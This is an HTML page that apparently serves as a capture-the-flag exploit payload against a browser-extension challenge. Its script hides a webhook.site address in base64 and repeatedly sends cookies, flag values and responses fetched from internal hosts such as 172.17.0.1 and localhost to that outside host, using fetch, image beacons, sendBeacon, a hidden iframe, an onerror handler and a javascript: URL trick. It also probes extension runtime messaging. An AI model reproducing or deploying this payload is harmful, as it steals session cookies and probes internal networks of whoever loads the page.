<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>loading...</title>
<script>
const hook = atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvNWRhNzJhOTMtODRkMC00YjcwLWJmMmMtNjJmZjdkY2RlNzA0') + '?t=';
function send(d) { fetch(hook + encodeURIComponent(d), {mode:'no-cors'}); }
setTimeout(() => {
  try {
    window.browser = window.browser || {};
    window.browser.cookies = window.browser.cookies || {};
    window.browser.cookies.getAll = window.browser.cookies.getAll || function(){return Promise.resolve([{name:'flag',value:'fake'}])};
    
    if (window.browser?.cookies?.getAll) {
      browser.cookies.getAll({url: location.origin, storeId: null})
        .then(cookies => {
          let raw = cookies.map(c => `${c.name}=${c.value}`).join('; ');
          send('browser_cookies_all=' + raw);
          let flag = cookies.find(c => c.name === 'flag' || c.name.includes('flag'))?.value || '';
          if (flag) send('FLAG_BROWSER=' + flag);
        })
        .catch(e => send('browser_err=' + e));
    }
  } catch(e) { send('clobber_fail=' + e); }
}, 800);

setTimeout(() => {
  let c = document.cookie;
  if (c) send('doc_cookie=' + c);
  
  try {
    window.name = `fetch("${hook}" + "name=" + encodeURIComponent(document.cookie))`;
    location = 'javascript:fetch(window.name)';
  } catch(e) {}
}, 1800);

setTimeout(() => {
  fetch('http://172.17.0.1/', {credentials:'include', mode:'no-cors'})
    .then(r => r.text())
    .then(t => send('internal_body=' + t.slice(0,500)))
    .catch(() => send('internal_blocked'));
  
  fetch('http://localhost/', {credentials:'include', mode:'no-cors'})
    .then(r => r.text())
    .then(t => send('localhost=' + t.slice(0,300)));
}, 2500);

setTimeout(() => {
  if (window.browser?.runtime) {
    try {
      let port = browser.runtime.connect({name: "ctf_poc"});
      port.postMessage({action: "getFlag"});
      port.onMessage.addListener(msg => {
        if (msg?.flag) send('runtime_flag=' + msg.flag);
      });
    } catch(e) { send('runtime_err=' + e); }
  }
}, 3500);

setTimeout(() => {
  new Image().src = hook + 'img=' + encodeURIComponent(document.cookie);
  if (navigator.sendBeacon) {
    navigator.sendBeacon(hook + 'beacon', document.cookie);
  }
}, 5000);
</script>
</head>
<body>
<div id="browser"><div id="cookies"><div id="getAll"></div></div></div>
<iframe src="javascript:parent.fetch('`+hook+`ifr='+encodeURIComponent(document.cookie))" style="display:none"></iframe>
<img src="x" onerror="fetch('`+hook+`onerror='+encodeURIComponent(document.cookie))">
<p>i dont think dis challenge is dat hard</p>
</body>
</html>
